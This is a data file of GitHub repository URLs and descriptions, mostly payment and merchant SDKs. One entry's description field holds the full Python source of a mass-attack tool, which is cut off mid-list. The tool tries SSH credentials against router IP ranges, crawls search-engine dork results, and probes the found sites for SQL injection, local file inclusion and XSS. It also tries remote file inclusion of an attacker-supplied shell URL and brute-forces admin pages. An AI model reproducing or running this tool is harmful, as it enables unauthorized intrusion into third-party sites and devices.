0,https://github.com/bennya8/go-union-payment.git,"UnionPayment ÊòØ‰∏Ä‰∏™Êï¥ÂêàÂêÑÁßçÁ¨¨‰∏âÊñπÊîØ‰ªòÁΩëÂÖ≥ÁöÑÂ∑•ÂÖ∑, ËÆ°ÂàíÊîØÊåÅ WechatÔºàÂæÆ‰ø°ÊîØ‰ªòÔºâ„ÄÅAlipayÔºàÊîØ‰ªòÂÆùÔºâ„ÄÅQpayÔºàQQÈí±ÂåÖÔºâ„ÄÅCMBÔºàÊãõÂïÜÈì∂Ë°åÔºâÁ≠â„ÄÇPayment is a Go version of the payment aggregation third-party SDK, which integrates WeChat, Alipay, Qpay, and China Merchant Bank payment.",,13
0,https://github.com/WHMCS/sample-merchant-gateway.git,Sample Merchant Payment Gateway Module for WHMCS,,12
0,https://github.com/openstream/Magento5CentRounding.git,Magento 5-Rappen-Rundung for Swiss Magento Merchants,,12
0,https://github.com/brainblocks/BrainBlocksWebPoS.git,Web Point of Sale for BrainBlocks Merchants,,12
0,https://github.com/culturekings/afterpay.git,PHP Afterpay Integration exposing the Merchant and InStore APIs - Unsupported April 2021,"afterpay,php,payments",12
0,https://github.com/FeeFighters/objective_merchant.git,"{""Port of Shopify's active_merchant ruby library to Objective-C""}",,12
0,https://github.com/atlantis-ATIS/atlantis.git,"ATIS public chain technology is derived from the technology geek on the dark web. Based on a deep understanding of system governance and the financial industry, it integrates traditional finance, cryptography, smart contracts, proof of stake, artificial intelligence, cross-border trade, payment settlement, and cross-chain Next-generation public chain of technology, PoA mining, atomic trading, chain merchant ecology, decentralized exchange, cloud disk, and social networking.  ATIS technology application system ATIS DAPP is a universal, easy-to-expand, flexible and secure credit and intelligent network ecosystem based on the technical characteristics of the blockchain, using cloud computing, artificial intelligence, intelligent Internet of Things, and big data technologies.  ATIS DAPP is a consensus ecosystem, building a more diverse business application scenario, and the entire consensus ecological application service layer is more intelligent and secure.",,12
0,https://github.com/magento-hackathon/Hackathon_StaticAssetsCache.git,"{""Static assets, browser caches, HTTP headers which are an utter mess, CDNs and changing designs on websites... it all adds up to create an utter mess for anyone trying to deploy major changes to UI components of a website.\n\nCLS has built a customization which we include on all of our builds to version the combined CSS/JS assets used on a site (unfortunately it's not isolated and wouldn't make a good base for this). This has proved to be a major help. No waiting on a CDN to purge itself and no wondering how many clients are still seeing an old CSS file which may no longer match the current DOM structure.\n\nExtending this to reach all assets would be a stellar addition to core and benefit all merchants. Even something as simple as a timestamp stored in a cache record and then included URLs spit out to browsers would be an improvement. The trick is figuring out what method to use which works across all asset types, is compatible with origin CDN setups and is also reliable.""}",,12
0,https://github.com/hamptus/fbacalculator.git,Calculates Amazon FBA Fees for Merchants,,11
0,https://github.com/Bitcoin-com/bitcoin-cash-merchant-ios.git,This is Bitcoin Cash Merchant App for iOS built with Swift by the Bitcoin.com Team. Enjoy!,,11
0,https://github.com/augustusnaz/laravel-google-merchant-api.git,A sweet Laravel implementation of Google Merchant API for Google Shopping.,,11
0,https://github.com/gwillem/magento-security-resources.git,Crowd-sourced resources to help merchants mitigate and prevent Magento security incidents,,11
0,https://github.com/RazerMS/rms-mobile-xdk-flutter-beta.git,Razer Merchant Services mobile payment for Flutter (Dart),,11
0,https://github.com/mrk-9/Blockchain-iOS-merchant-app.git,"Merchants can register a Bitcoin address to receive payments. The app subscribes to the address through the blockchain.info websocket. When an amount is charged, the websocket opens. The transaction hash is obtained from the message received by the websocket when funds are received to the address.",,11
0,https://github.com/mithunsasidharan/Merchant-Guide-To-Galaxy.git,Java Implementation of the famous game Merchant Guide To Galaxy,,10
0,https://github.com/bitcoin-sv/merchantapi-reference.git,Merchant API reference implementation,,10
0,https://github.com/karask/bitcoinpos.git,This project provides a Bitcoin Point of Sale system to allow merchants to accept bitcoins.,,10
0,https://github.com/BlockIo/gem-block-io.git,"Ruby library for Block.io. The easiest way to create, and use, Bitcoin, Dogecoin, and Litecoin wallets for payments as everyday users, and merchants.",,10
0,https://github.com/drizzentic/AirtelMoneyLib.git,A php implementation of Airtel money Merchant query API,,10
0,https://github.com/SeNaP/node-robokassa.git,Robokassa merchant for node,,10
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-PHP.git,Sample PHP API client for communicating with SpectroCoin Bitcoin Merchant API,,10
0,https://github.com/zooitje/ultra-simple-Bitcoin-merchant.git,"a simple Bitcoin merchant / payment system that is easy to install, expandable, multilanguage and entirely written in PHP",,10
0,https://github.com/DrLina/Shopify-AMP-Theme.git,"This is the first Shopify theme to provide a fully Google AMP compatible website template, allowing merchants to create online stores which are consistently high-performing, fast and beautiful across many different devices and distribution platforms.",,10
0,https://github.com/timols/fourmer.git,Foursquare Merchant API,,10
0,https://github.com/MobilePayDev/MobilePay-Subscriptions.git,"With Subscriptions you will collect your subscriptions to MobilePay simply with a swipe. Our api enables you to establish and manage agreements between you, the merchant, and MobilePay users. ","mobilepay,subscriptions,api,rest-api",10
0,https://github.com/claudiosanches/woocommerce-google-merchant-center-feed.git,Google Merchant Center Feed,,9
0,https://github.com/burhan/e24PaymentPipe.git,ACI Merchant Gateway PaymentPipe Python Implementation,"python,payments,knet",9
0,https://github.com/cuker/merchant-gateways.git,"A common interface to any payment system, and a list of supported merchants (like RoR ActiveMerchant)",,9
0,https://github.com/wikimart/merchant-api-client.git,Wikimart Merchant API client on PHP,,9
0,https://github.com/mrk-9/iOS_Blockchain-Merchant.git,"Blockchain, merchant, QR code, Bitcoin wallet, BTC, Payment integration",,9
0,https://github.com/jleclanche/python-iso18245.git,Python implementation of the ISO 18245 Merchant Category Codes database ‚õ∫,"iso,iso18245,mcc,finance,banking,fintech,python",9
0,https://github.com/kancart/PrestaShop-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for PrestaShop (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,9
0,https://github.com/nozzlegear/deliver-on.git,"A small Shopify app that lets merchants add a ""Deliver On"" date selector to their cart page or post-checkout page.",,9
0,https://github.com/gary-rowe/MultiBitStore.git,‚ö†Ô∏è OBSOLETE. DO NOT USE! A MultiBit Merchant client providing a complete online store using Bitcoin. Fully customisable.,,9
0,https://github.com/Makewebbetter/enhanced-woocommerce-mautic-integration.git,Mautic WooCommerce Integration helps the WooCommerce merchants to automate their regular marketing tasks in just a few clicks. This integration automatically syncs the WooCommerce store data like contacts and marketing campaigns with mautic in real-time and makes it easier to analyze customer segment data with RFM analysis.,"ecommerce,marketing-automation,mautic,mautic-integration,woocommerce",9
0,https://github.com/awazgyawali/flutter_khalti.git,Khalti SDK for flutter apps. Khalti Merchant can use this library to integrate the payment system into their flutter app easily.,,9
0,https://github.com/verotel/flexpay-php-client.git,Verotel FlexPay allows Verotel merchants to charge for content,,8
0,https://github.com/cavirtex/merchants.git,Shopping cart plugins using the cavirtex merchant API,,8
0,https://github.com/ahmedsaoud31/payfort-php.git,"Payfort php Library ""Merchant Page 2.0""",,8
0,https://github.com/ebeigarts/active_merchant_first_data.git,First Data Latvia gateway for Active Merchant,,8
0,https://github.com/RoyMachineLearning/Elo-Merchant-Category-Recommendation.git,Kaggle Competition : Elo Merchant Category Recommendation,,8
0,https://github.com/RazerMS/rms-mobile-xdk-reactnative-beta.git,Razer Merchant Services mobile payment for React Native (BETA),,8
0,https://github.com/mrk-9/Android_Blockchain-Merchant.git,"Blockchain, merchant, QR code, Bitcoin wallet, BTC, Payment integration",,8
0,https://github.com/evtatarintsev/advcash-api-client.git,Python wrapper around AdvCash Merchant API,,8
0,https://github.com/stympy/active_merchant.git,Mirror of active merchant plugin,,8
0,https://github.com/marcelja/dynamicpricing.git,This is the best merchant of all time,"dynamic,pricing",8
0,https://github.com/marcelja/dynamicpricing.git,This is the best merchant of all time,"dynamic,pricing",8
0,https://github.com/CityChainFoundation/city-hub.git,"The City Hub is the one-stop-app that citizens, merchants and others can get an overview of everything related to their data on the City Chain and the Smart City Platform. ",,8
0,https://github.com/magenable/covide19-notice.git,"Magento 2 free open source extension displaying notice at the top of the page, useful for COVID-19 affected merchants","magento2,magento,covid19",8
0,https://github.com/Amitelazari/Legal-bug-bounty.git,"This is the #legalbugbounty standardization project. As I explain in my Enigma talk and my papers - the legal landscape of bug bounties is currently lacking. Safe harbor is the exception, not the standard and thousands of thousands of hunters are put in ""legal\'s"" harm way. I\'ve suggested that bug bounty legal terms, starting with safe harbor, could and should be standardized. Once standardization of bug bounty legal language is achieved, the bug bounty economy will become an alternate private legal regime in which white-hat hacking is celebrated through regulatory incentives. Standardization will start a race-to-the-top over the quality of bug bounty terms.  This project, supported by CLTC, aims to achieve standardization of bug bounty legal terms across platforms, industries and sponsors, in line with the DOJ framework, and akin to the licenses employed by Creative Commons and the open source industry. This will reduce the informational burden and increase hackers‚Äô awareness of terms (salience). It could also signal whether a particular platform or company conforms with the standard terms that are considered best practice. Finally, it could reduce the drafting costs of the platform or sponsoring program, as well as the transactional costs. While some organizations (such as governmental or financial organizations) might require adjustments, generally the legal concerns of bug bounties‚Äô sponsors and platforms are similar and could be addressed in standardized language.        Moreover, standardization should be used to ensure that hackers have authorized access to any third-parties data or components implemented in the bug bounty administrator product/network, and to facilitate coordinated disclosure of third-party vulnerabilities found (and ethically disclosed). Companies and platforms should coordinate to ensure that such clauses are included in all terms, facilitating a best practice mentality in the industry.              The benefits of standardization in bug bounties/CVDs of legal language across industries and platforms in light of DOJ framework       +One language of safe harbor akin to Creative Commons/Open Source       +Create an industry standard that will serve as a benchmark and signal to hackers if companies don‚Äôt adopt it         +Reduce the informational burden and increase hackers‚Äô awareness towards terms       +Reduce transaction and drafting costs        +Create a reputation system for legal terms       You must consult with a lawyer       Disclaimer: this report does not constitute legal advice and the author is not admitted to practice law in the U.S. The information contained herein is for general guidance on matters of interest only. The application and impact of laws can vary widely based on the specific facts involved. Given the changing nature of laws, terms, rules and regulations, there may be delays, omissions or inaccuracies in information contained herein. Accordingly, the information is provided with the understanding that the author is not herein engaged in rendering legal or other professional advice and services. As such, it should not be used as a substitute for consultation with professional legal or other competent advisers. Before making any decision or taking any action, you should consult a professional. All information is provided ‚Äúas is‚Äù, with no guarantee of completeness, accuracy, timeliness or of the results obtained from the use of this information, and without warranty of any kind, express or implied, including, but not limited to warranties of performance, merchantability and fitness for a particular purpose. In no event will the author be liable to you or anyone else for any decision made or action taken in reliance on the information herein or for any consequential, special or similar damages.",,8
0,https://github.com/Lexiks/BitServ.git,Bitcoin merchant,,7
0,https://github.com/Fruitware/VictoriaBankGateway.git,Victoria bank e-Commerce Gateway merchant interface,"bank-integration,moldova,gateway-client,php-library,composer-package,bank-responses,commerce-transactions,packagist,php",7
0,https://github.com/Mastercard/api-ref-app-merchant-identifier.git,Reference application for Merchant Identifier API,,7
0,https://github.com/kulapio/libra-merchant.git,Libra Merchant with QR Payment,,7
0,https://github.com/revolut-engineering/revolut-merchant-api-example-next-js.git,Revolut Merchant API Integration Example for React.js + Next.js,"revolut,acquiring,nextjs,reactjs",7
0,https://github.com/kancart/Magento-Web-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for Magento (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,7
0,https://github.com/osCommerce/oscommerce_cvs.git,CVS history of The Exchange Project v2.0 and osCommerce Online Merchant v2.2 (available only for historical purposes),,7
0,https://github.com/YangKing0834131/2018-User-purchase-forecast.git,China Merchants Bank Credit Card Center Campus Competition: Prediction of User Purchases in the Consumer Finance Scenario A Ranking: rank2 B Ranking: rank3,,7
0,https://github.com/xDAnkit/react-native-google-pay-tez.git,Google Pay(Tez) Native package for Merchants to accept payments for customers using react native mobile app,"react-native,android,googlepaytez,npm",7
0,https://github.com/craigchristenson/2checkout_rails_example.git,Example Rails shopping cart the demonstrates 2Checkout active merchant integration.,,7
0,https://github.com/danwrong/acts-as-money.git,Extensions to Active Record for dealing with storing currency.  Compatible with Active Merchant.,,7
0,https://github.com/commercetools/merchant-center-starter-app.git,A starter example for building a Merchant Center application üõ†üöÄ,,7
0,https://github.com/UncleCatMySelf/MyPass.git,ÂïÜÊà∑ÊäïÊîæÁ≥ªÁªüÔºàmerchantsÔºâ„ÄÅÁî®Êà∑Â∫îÁî®Á≥ªÁªüÔºàpassbookÔºâÂÆûÁé∞ÊôÆÈÄöÁ∫ø‰∏äÂç°ÂåÖÂ∫îÁî®ÔºàHbaseÂàÜÂ∏ÉÂºèÂ§ÑÁêÜ„ÄÅKafkaÊ∂àÊÅØÈòüÂàóÊúçÂä°„ÄÅÂç°ÂåÖ‰ºòÊÉ†Âç∑ÂäüËÉΩÔºâ,,7
0,https://github.com/gadia-aayush/Categorizing-Bank-Transactions.git,"The script basically categorizes bank statements transactions based on Mode of Transaction, Category of Merchant & Repeat Transaction Categorization.","r,r-programming,tidying-data,categorization,csv,excel,categorizing-bank-transactions",7
0,https://github.com/BlockchainLabs/NobleCoin.git,"{""ADD SUPPORT FOR YOUR COIN  The development and services behind Noble were crowdfunded via the sale of the NOXT token. This token can be used to buy support for your own cryptocurrency, making it too an international option for digital currency payments and purchases. Click here to add your coin to the Noble platform, and begin purchasing and paying bills in your favourite cryptocurrency today. ADD FULL GIFT AND PAY SUPPORT Give your own coin the ability to act as an international method of payments and purchases, including taxes, bills, credit cards and gift cards.  PAY ZERO FEES USER SUPPORT LEGAL AND LONG-TERM FOCUS  07. HOW IT WORKS PAYMENTS AND GIFTS  Using Noble Pay and Noble Gift is a straight-forward affair, allowing you to make an order and pay using your preferred cryptocurrency method in minutes.  PAY OR PURCHASE ONLINE PAY ONLINE RIGHT NOW  Smaller purchases and payments can be made online right now, without the need for the Noble mobile application, accounts or AML/KYC requirements. NOBLE PAY  Pay Australian taxes and bills, deposit directly into bank accounts, transfer into European accounts, pay off credits cards, the list keeps growing. Do smaller transfers and payments using Noble Pay online right now.  NOBLE GIFT  Purchase from a range of over 400 international gift in many dominations of fiat currency and exchanged from digital currencies. |50+ CRYPTOCURRENCIES SUPPORTED A FOCUS ON REAL-WORLD USAGE  Beyond technical features, experimental code and revolutionary ideas, Noble provides real-world, day-to-day usage to blockchains so they remain, first and foremost, a unique type of currency.  GIFT CARDS  Purchase over 400 international gift cards using Bitcoin or using one of more than 50 alternative cryptocurrencies.  BILLS & TAXES  Pay Australian or European bills and taxes using cryptocurrency. Noble handles all exchange and local payment systems internally.  BANK DEPOSITS  Automatically exchange and deposit directly into Australian and European bank accounts using Noble-supported alternative cryptocurrencies and Bitcoin.  USER-TO-USER  Save addresses, register accepted digital currencies, and pay users completely in-app, letting Noble handle exchange rates and transfers in the background (in development). 02. NOBLE MOVEMENT THE CURRENCY IN CRYPTOCURRENCY  Noble development is focused first and foremost on blockchain-based cryptocurrency, aiming to ultimately remove the need for fiat and exit ramps completely. SEARCH FOR AND USE YOUR FAVOURITE CRYPTOCURRENCY  Noble is developed to inherently support any number of cryptocurrencies, linked into multiple API's and using custom wallet and exchange systems where necessary. MULTIPLE AUTOMATIC METHODS OF EXCHANGE AND TRANSFER  Depending on the cryptocurrency and fiat pair selected, exchange rates are automatically gathered from a wide range of sources. ONGOING DEVELOPMENT AND NEW FEATURES CONTINUOUSLY ADDED  Development of Noble is ongoing, with each patch bringing improved design, usability and features to the application. GLOBAL CRYPTOCURRENCY USAGE ON YOUR MOBILE PHONE  Using the power of Bitcoin and the blockchain, digital payments, purchases and transfers are available internationally with zero-to-low fees. FIND AND INTERACT WITH LIKE-MINDED ENTHUSIASTS  In development for Noble is a complete user-to-user based localisation, payment and merchant system allowing users to trade and purchase between themselves. NO PRIVATE KEYS REQUESTED OR STORED  Noble does not currently act as a wallet, instead linking into to cryptocurrency-specific wallets outside the application. This prevents us from generating, storing or being responsible for any private keys. Your money is in your control. 04. WHAT'S NEW VERSION 0.2.0  Version 0.2.0 saw Noble Pay introduce European (EUR) payments to over 17 countries via SEPA and IBAN, including EUR currency exchange rates. User areas were improved, including payment history and AML/KYC status. The direct bank deposit capability in Australia, using a BSB and account number, was also polished. View patch notes | NOBLE BLOCKCHAIN PAYMENT APP  Noble is an international mobile payment, gift and product application for over fifty blockchain-based digital currencies. It further aims to incorporate blockchain technology into digital identity systems, international digital currency AML/KYC security to help combat financial fraud and money laundering, and real estate ownership and land rights.""}",,7
0,https://github.com/udinparla/aa.py.git,"#!/usr/bin/env python import re import hashlib import Queue from random import choice import threading import time import urllib2 import sys import socket  try:     import paramiko      PARAMIKO_IMPORTED = True except ImportError:     PARAMIKO_IMPORTED = False    USER_AGENT = [""Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3"",              ""Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7"",              ""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",              ""Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"",              ""YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"", \t     ""Mozilla/5.0 (Windows; U; Windows NT 5.1) AppleWebKit/535.38.6 (KHTML, like Gecko) Version/5.1 Safari/535.38.6"", \t     ""Mozilla/5.0 (Macintosh; U; U; PPC Mac OS X 10_6_7 rv:6.0; en-US) AppleWebKit/532.23.3 (KHTML, like Gecko) Version/4.0.2 Safari/532.23.3""             ] option = \' \' vuln = 0 invuln = 0 np = 0 found = []   class Router(threading.Thread):     """"""Checks for routers running ssh with given User/Pass""""""     def __init__(self, queue, user, passw):         if not PARAMIKO_IMPORTED:             print \'You need paramiko.\'             print \'http://www.lag.net/paramiko/\'             sys.exit(1)         threading.Thread.__init__(self)              self.queue = queue          self.user = user         self.passw = passw       def run(self):         """"""Tries to connect to given Ip on port 22""""""         ssh = paramiko.SSHClient()         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())         while True:             try:                 ip_add = self.queue.get(False)              except Queue.Empty:                 break             try:                 ssh.connect(ip_add, username = self.user, password = self.passw, timeout = 10)                 ssh.close()                 print ""Working: %s:22 - %s:%s\\n"" % (ip_add, self.user, self.passw)                 write = open(\'Routers.txt\', ""a+"")                 write.write(\'%s:22 %s:%s\\n\' % (ip_add, self.user, self.passw))                 write.close()                   self.queue.task_done()              except:                 print \'Not Working: %s:22 - %s:%s\\n\' % (ip_add, self.user, self.passw)                 self.queue.task_done()                               class Ip:     """"""Handles the Ip range creation""""""     def __init__(self):         self.ip_range = []         self.start_ip = raw_input(\'Start ip: \')         self.end_ip = raw_input(\'End ip: \')         self.user = raw_input(\'User: \')         self.passw = raw_input(\'Password: \')         self.iprange()             def iprange(self):         """"""Creates list of Ip\'s from Start_Ip to End_Ip""""""         queue = Queue.Queue()         start = list(map(int, self.start_ip.split(""."")))         end = list(map(int, self.end_ip.split(""."")))         tmp = start                 self.ip_range.append(self.start_ip)         while tmp != end:             start[3] += 1             for i in (3, 2, 1):                 if tmp[i] == 256:                     tmp[i] = 0                     tmp[i-1] += 1             self.ip_range.append(""."".join(map(str, tmp)))                 for add in self.ip_range:             queue.put(add)          for i in range(10):             thread = Router(queue, self.user, self.passw )             thread.setDaemon(True)             thread.start()          queue.join()   class Crawl:     """"""Searches for dorks and grabs results""""""     def __init__(self):         if option == \'4\':             self.shell = str(raw_input(\'Shell location: \'))         self.dork = raw_input(\'Enter your dork: \')         self.queue = Queue.Queue()         self.pages = raw_input(\'How many pages(Max 20): \')         self.qdork = urllib2.quote(self.dork)         self.page = 1         self.crawler()         def crawler(self):         """"""Crawls Ask.com for sites and sends them to appropriate scan""""""         print \'\\nDorking...\'         for i in range(int(self.pages)):             host = ""http://uk.ask.com/web?q=%s&page=%s"" % (str(self.qdork), self.page)             req = urllib2.Request(host)             req.add_header(\'User-Agent\', choice(USER_AGENT))             response = urllib2.urlopen(req)             source = response.read()             start = 0             count = 1             end = len(source)             numlinks = source.count(\'_t"" href\', start, end)               while count < numlinks:                 start = source.find(\'_t"" href\', start, end)                 end = source.find(\' onmousedown=""return pk\', start,  end)                 link = source[start+10:end-1].replace(""amp;"","""")                 self.queue.put(link)                 start = end                 end = len(source)                 count = count + 1              self.page += 1          if option == \'1\':             for i in range(10):                 thread = ScanClass(self.queue)                 thread.setDaemon(True)                 thread.start()              self.queue.join()          elif option == \'2\':             for i in range(10):                 thread = LScanClass(self.queue)                 thread.setDaemon(True)                 thread.start()              self.queue.join()          elif option == \'3\':             for i in range(10):                 thread = XScanClass(self.queue)                 thread.setDaemon(True)                 thread.start()              self.queue.join()          elif option == \'4\':             for i in range(10):                 thread = RScanClass(self.queue, self.shell)                 thread.setDaemon(True)                 thread.start()              self.queue.join()      class ScanClass(threading.Thread):     """"""Scans for Sql errors and ouputs to file""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.queue = queue         self.schar = ""\'""         self.file = \'sqli.txt\'       def run(self):         """"""Scans Url for Sql errors""""""         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if \'=\' in site:                 global vuln                 global invuln                 global np                 test = site + self.schar                  try:                     conn = urllib2.Request(test)                     conn.add_header(\'User-Agent\', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(""error in your SQL syntax"", data, re.I)):                         self.mysql(test)                         vuln += 1                     elif (re.findall(\'oracle.jdbc.\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'system.data.oledb\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'SQL command net properly ended\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'atoracle.jdbc.\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'java.sql.sqlexception\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'query failed:\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'postgresql.util.\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'mysql_fetch\', data, re.I)):                         self.mysql(test)                         vuln += 1                     elif (re.findall(\'Error:unknown\', data, re.I)):                         self.mysql(test)                         vuln += 1                     elif (re.findall(\'JET Database Engine\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'Microsoft OLE DB Provider for\', data, re.I)):                         self.mssql(test)                         vuln += 1 \t\t    elif (re.findall(\'mysql_numrows\', data, re.I)):                         self.mysql(test)                         vuln += 1 \t\t    elif (re.findall(\'mysql_num\', data, re.I)):                         self.mysql(test)                         vuln += 1 \t\t    elif (re.findall(\'Invalid Query\', data, re.I)):                         self.mysql(test)                         vuln += 1 \t\t    elif (re.findall(\'FetchRow\', data, re.I)):                         self.mysql(test)                         vuln += 1                     elif (re.findall(\'JET Database\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'OLE DB Provider for\', data, re.I)):                         self.mssql(test)                         vuln += 1                     elif (re.findall(\'Syntax error\', data, re.I)):                         self.mssql(test)                         vuln += 1                     else:                         print B+test + W+\' <-- Not Vuln\'                         invuln += 1             else:                 print R+site + W+\' <-- No Parameters\'                 np += 1             self.queue.task_done()       def mysql(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file, ""a+"").read()         if url in read:             print G+\'Dupe: \' + W+url         else:             print O+""MySql: "" + url + W             write = open(self.file, ""a+"")             write.write(\'[SQLI]: \' + url + ""\\n"")             write.close()      def mssql(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file).read()         if url in read:             print G+\'Dupe: \' + url + W         else:             print O+""MsSql: "" + url + W \t    write = open (self.file, ""a+"")             write.write(\'[SQLI]: \' + url + ""\\n"")             write.close()      class LScanClass(threading.Thread):     """"""Scans for Lfi errors and outputs to file""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.file = \'lfi.txt\'         self.queue = queue         self.lchar = \'../\'              def run(self):         """"""Checks Url for File Inclusion errors""""""         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if \'=\' in site:                 lsite = site.rsplit(\'=\', 1)[0]                 if lsite[-1] != ""="":                     lsite = lsite + ""=""                 test = lsite + self.lchar                 global vuln                 global invuln                 global np                  try:                     conn = urllib2.Request(test)                     conn.add_header(\'User-Agent\', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                  except:                     self.queue.task_done()                  else:                     if (re.findall(""failed to open stream: No such file or directory"", data, re.I)):                         self.lfi(test)                         vuln += 1                     else:                         print B+test + W+\' <-- Not Vuln\'                         invuln += 1             else:                 print R+site + W+\' <-- No Parameters\'                  np += 1               self.queue.task_done()       def lfi(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file, ""a+"").read()         if url in read:             print G+\'Dupe: \' + url + W         else:             print O+""Lfi: "" + url + W             write = open(self.file, ""a+"")             write.write(\'[LFI]: \' + url + ""\\n"")             write.close()         class XScanClass(threading.Thread):     """"""Scan for Xss errors and outputs to file""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.queue = queue         self.xchar = """"""<ScRIpT>alert(\'xssBYm0le\');</ScRiPt>""""""         self.file = \'xss.txt\'       def run(self):         """"""Checks Url for possible Xss""""""         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if \'=\' in site:                 global vuln                 global invuln                 global np                 xsite = site.rsplit(\'=\', 1)[0]                 if xsite[-1] != ""="":                     xsite = xsite + ""=""                 test = xsite + self.xchar                 try:                     conn = urllib2.Request(test)                     conn.add_header(\'User-Agent\', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(""xssBYm0le"", data, re.I)):                         self.xss(test)                         vuln += 1                     else:                         print B+test + W+\' <-- Not Vuln\'                         invuln += 1             else:                 print R+site + W+\' <-- No Parameters\'                 np += 1             self.queue.task_done()       def xss(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file, ""a+"").read()         if url in read:             print G+\'Dupe: \' + url + W         else:             print O+""Xss: "" + url + W             write = open(self.file, ""a+"")             write.write(\'[XSS]: \' + url + ""\\n"")             write.close()      class RScanClass(threading.Thread):     """"""Scans for Rfi errors and outputs to file""""""     def __init__(self, queue, shell):         threading.Thread.__init__(self)         self.queue = queue         self.file = \'rfi.txt\'         self.shell = shell       def run(self):         """"""Checks Url for Remote File Inclusion vulnerability""""""         while True:             try:                 site = self.queue.get(False)             except Queue.Empty:                 break             if \'=\' in site:                 global vuln                 global invuln                 global np                 rsite = site.rsplit(\'=\', 1)[0]                 if rsite[-1] != ""="":                     rsite = rsite + ""=""                 link = rsite + self.shell + \'?\'                 try:                     conn = urllib2.Request(link)                     conn.add_header(\'User-Agent\', choice(USER_AGENT))                     opener = urllib2.build_opener()                     data = opener.open(conn).read()                 except:                     self.queue.task_done()                 else:                     if (re.findall(\'uname -a\', data, re.I)):                         self.rfi(link)                         vuln += 1                     else:                         print B+link + W+\' <-- Not Vuln\'                         invuln += 1             else:                 print R+site + W+\' <-- No Parameters\'                 np += 1                     self.queue.task_done()         def rfi(self, url):         """"""Proccesses vuln sites into text file and outputs to screen""""""         read = open(self.file, ""a+"").read()         if url in read:             print G+\'Dupe: \' + url + W         else:             print O+""Rfi: "" + url + W             write = open(self.file, ""a+"")             write.write(\'[Rfi]: \' + url + ""\\n"")             write.close()           class Atest(threading.Thread):     """"""Checks given site for Admin Pages/Dirs""""""     def __init__(self, queue):         threading.Thread.__init__(self)         self.queue = queue       def run(self):         """"""Checks if Admin Page/Dir exists""""""         while True:             try:                 site = self.queue.get(False)              except Queue.Empty:                 break             try:                 conn = urllib2.Request(site)                 conn.add_header(\'User-Agent\', choice(USER_AGENT))                 opener = urllib2.build_opener()                 opener.open(conn)                 print site                 found.append(site)                 self.queue.task_done()                 except urllib2.URLError:                 self.queue.task_done()   def admin():     """"""Create queue and threads for admin page scans""""""     print \'Need to include http:// and ending /\\n\'     site = raw_input(\'Site: \')     queue  = Queue.Queue()     dirs = [\'admin.php\', \'admin/\', \'en/admin/\', \'administrator/\', \'moderator/\', \'webadmin/\', \'adminarea/\', \'bb-admin/\', \'adminLogin/\', \'admin_area/\', \'panel-administracion/\', \'instadmin/\',              \'memberadmin/\', \'administratorlogin/\', \'adm/\', \'admin/account.php\', \'admin/index.php\', \'admin/login.php\', \'admin/admin.php\', \'admin/account.php\',              \'joomla/administrator\', \'login.php\', \'admin_area/admin.php\' ,\'admin_area/login.php\' ,\'siteadmin/login.php\' ,\'siteadmin/index.php\', \'siteadmin/login.html\',              \'admin/account.html\', \'admin/index.html\', \'admin/login.html\', \'admin/admin.html\', \'admin_area/index.php\', \'bb-admin/index.php\', \'bb-admin/login.php\',              \'bb-admin/admin.php\', \'admin/home.php\', \'admin_area/login.html\', \'admin_area/index.html\', \'admin/controlpanel.php\', \'admincp/index.asp\', \'admincp/login.asp\',              \'admincp/index.html\', \'admin/account.html\', \'adminpanel.html\', \'webadmin.html\', \'webadmin/index.html\', \'webadmin/admin.html\', \'webadmin/login.html\',              \'admin/admin_login.html\', \'admin_login.html\', \'panel-administracion/login.html\', \'admin/cp.php\', \'cp.php\', \'administrator/index.php\', \'cms\', \'administrator/login.php\',             \'nsw/admin/login.php\', \'webadmin/login.php\', \'admin/admin_login.php\', \'admin_login.php\', \'administrator/account.php\' ,\'administrator.php\', \'admin_area/admin.html\',             \'pages/admin/admin-login.php\' ,\'admin/admin-login.php\', \'admin-login.php\', \'bb-admin/index.html\', \'bb-admin/login.html\', \'bb-admin/admin.html\', \'admin/home.html\',             